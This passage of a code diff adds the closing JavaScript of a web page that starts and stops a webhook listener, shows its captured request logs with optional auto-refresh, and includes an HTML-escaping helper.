+    btnStart.style.display = 'inline-flex';
+    btnStop.style.display = 'none';
+  }
+}
+
+async function startWebhook() {
+  try {
+    const r = await apiFetch('/api/webhook/start', { method: 'POST' });
+    if (r.ok) { updateWebhookUI(true); refreshWebhookLogs(); }
+  } catch(e) { console.error(e); }
+}
+
+async function stopWebhook() {
+  try {
+    const r = await apiFetch('/api/webhook/stop', { method: 'POST' });
+    if (r.ok) { updateWebhookUI(false); }
+  } catch(e) { console.error(e); }
+}
+
+async function refreshWebhookLogs() {
+  try {
+    const r = await apiFetch('/api/webhook/logs');
+    if (!r.ok) return;
+    const d = await r.json();
+    const el = document.getElementById('webhookLogs');
+    const entries = d.entries || [];
+    if (!entries.length) {
+      el.textContent = 'No events captured yet.';
+      return;
+    }
+    el.textContent = entries.map(e => {
+      const ts = e.timestamp ? new Date(e.timestamp).toLocaleString() : '';
+      const ip = e.remote_addr || '';
+      const method = e.method || '';
+      const path = e.path || '';
+      const body = e.body || '';
+      return `[${ts}] ${method} ${path} from ${ip}\n${body}\n${'─'.repeat(60)}`;
+    }).join('\n');
+    el.scrollTop = el.scrollHeight;
+  } catch(e) { console.error(e); }
+}
+
+function toggleAutoRefresh() {
+  const enabled = document.getElementById('webhookAutoRefresh').checked;
+  if (enabled) {
+    webhookAutoRefreshTimer = setInterval(refreshWebhookLogs, 5000);
+  } else {
+    if (webhookAutoRefreshTimer) { clearInterval(webhookAutoRefreshTimer); webhookAutoRefreshTimer = null; }
+  }
+}
+
+// ── Utilities ─────────────────────────────────────────────────────────────────
+function escH(s) {
+  return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+
+// ── Bootstrap ─────────────────────────────────────────────────────────────────
+init();
+</script>
+</body>
+</html>
